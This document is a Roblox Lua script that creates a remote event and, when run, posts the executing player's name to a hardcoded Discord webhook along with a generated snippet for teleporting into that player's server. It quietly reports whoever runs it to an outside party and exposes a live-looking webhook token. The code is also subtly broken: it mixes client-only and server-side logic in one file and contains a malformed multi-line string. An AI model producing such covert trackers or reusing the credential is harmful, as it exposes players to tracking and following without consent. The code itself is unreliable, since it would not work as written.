-- All-in-One Script for Webhook and Server Joining

-- Services
local httpService = game:GetService("HttpService")
local teleportService = game:GetService("TeleportService")
local players = game:GetService("Players")
local replicatedStorage = game:GetService("ReplicatedStorage")

-- Webhook URL
local webhookUrl = "https://discord.com/api/webhooks/1271812329788407818/xKG5Ku8CMt6oWN-uSvQ1nvcMugVZsJVsAeDJn4efnVyWbgiMIBApJ_c1GUKDSuCc5_tn"

-- Define RemoteEvent
local autoJoinEvent = Instance.new("RemoteEvent")
autoJoinEvent.Name = "AutoJoinEvent"
autoJoinEvent.Parent = replicatedStorage

-- Function to send webhook notification with embed
local function sendEmbedNotification(executorName)
    local joinScript = string.format([[
    local teleportService = game:GetService("TeleportService")
    local players = game:GetService("Players")

    local function findPlayerServer(playerName)
        for _, v in pairs(players:GetPlayers()) do
            if v.Name == playerName then
                return v
            end
        end
        return nil
    end

    local targetPlayer = findPlayerServer("%s")
    if targetPlayer then
        teleportService:TeleportToPlaceInstance(game.PlaceId, targetPlayer)
    else
        print("Player not found.")
    end
    ]], executorName)

    local data = {
        ["content"] = nil,
        ["embeds"] = {{
            ["title"] = "Script Executed!",
            ["description"] = executorName .. " has executed the script!",
            ["color"] = 16711680,
            ["fields"] = {{
                ["name"] = "Join the Server",
                ["value"] = "Run this script to join their server: 

".. joinScript .."
"
            }}
        }}
    }

    local jsonData = httpService:JSONEncode(data)
    httpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
end

-- Server-side event handling
autoJoinEvent.OnServerEvent:Connect(function(player)
    executorName = player.Name
    sendEmbedNotification(executorName)
end)

-- Function to trigger the event
local function executeScript()
    local player = players.LocalPlayer
    if player then
        autoJoinEvent:FireServer()
    end
end

-- Execute the script when the player runs this file
executeScript()
